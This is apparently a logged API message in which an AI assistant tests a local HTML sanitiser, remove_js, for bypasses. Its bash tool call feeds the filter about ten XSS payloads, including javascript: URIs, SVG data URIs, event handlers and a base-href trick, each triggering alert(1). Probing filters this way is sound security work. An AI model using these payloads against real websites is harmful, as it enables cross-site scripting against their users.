@@ -1,0 +1,46 @@
+{
+  "id": "gen-1775055742-cCW9NyhazAZvndDnpDfB",
+  "container": null,
+  "content": [
+    {
+      "citations": null,
+      "text": "Interesting! The `<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">` passes through! Let me check if that actually works in Chrome though - Chrome might block `javascript:` URIs in meta refresh. Let me also look at other approaches.",
+      "type": "text"
+    },
+    {
+      "id": "toolu_bdrk_01XMxBWK1mgHwRw8VPNLxGgv",
+      "caller": {
+        "type": "direct"
+      },
+      "input": {
+        "command": "python3 -c \"\nimport sys\nsys.path.insert(0, '/app')\nfrom filter import remove_js\n\ntests = [\n    # a href with javascript and autofocus - needs click though\n    '<a href=\\\"javascript:alert(1)\\\" id=\\\"a\\\">x</a><script>document.getElementById(\\\"a\\\").click()</script>',\n    # SVG use with data URI\n    '<svg><use href=\\\"data:image/svg+xml,<svg xmlns=\\'http://www.w3.org/2000/svg\\'><script>alert(1)</script></svg>\\\"></use></svg>',\n    # Link with javascript\n    '<link rel=\\\"stylesheet\\\" href=\\\"javascript:alert(1)\\\">',\n    # Style with expression (IE only)\n    '<div style=\\\"background:url(javascript:alert(1))\\\">',\n    # Base href\n    '<base href=\\\"javascript:alert(1)//\\\"><a href=\\\"\\\" id=x>x</a>',\n    # Form action\n    '<form action=\\\"javascript:alert(1)\\\"><button>X</button></form>',\n    # marquee onstart\n    '<marquee onstart=\\\"alert(1)\\\">',\n    # video poster onerror\n    '<video><source onerror=\\\"alert(1)\\\">',\n    # style tag injection\n    '<style>@import \\\"javascript:alert(1)\\\";</style>',\n    # image tag (different from img)\n    '<image src=x onerror=\\\"alert(1)\\\">',\n]\n\nfor t in tests:\n    result = remove_js(t)\n    print(f'Input:  {t}')\n    print(f'Output: {result}')\n    print()\n\"\n"
+      },
+      "name": "bash",
+      "type": "tool_use"
+    }
+  ],
+  "model": "anthropic/claude-4.6-opus-20260205",
+  "role": "assistant",
+  "stop_reason": "tool_use",
+  "stop_sequence": null,
+  "type": "message",
+  "usage": {
+    "cache_creation": null,
+    "cache_creation_input_tokens": 0,
+    "cache_read_input_tokens": 0,
+    "inference_geo": null,
+    "input_tokens": 4224,
+    "output_tokens": 519,
+    "server_tool_use": null,
+    "service_tier": null,
+    "speed": "standard",
+    "cost": 0.034095,
+    "is_byok": false,
+    "cost_details": {
+      "upstream_inference_cost": 0.034095,
+      "upstream_inference_prompt_cost": 0.02112,
+      "upstream_inference_completions_cost": 0.012975
+    }
+  },
+  "provider": "Amazon Bedrock"
+}
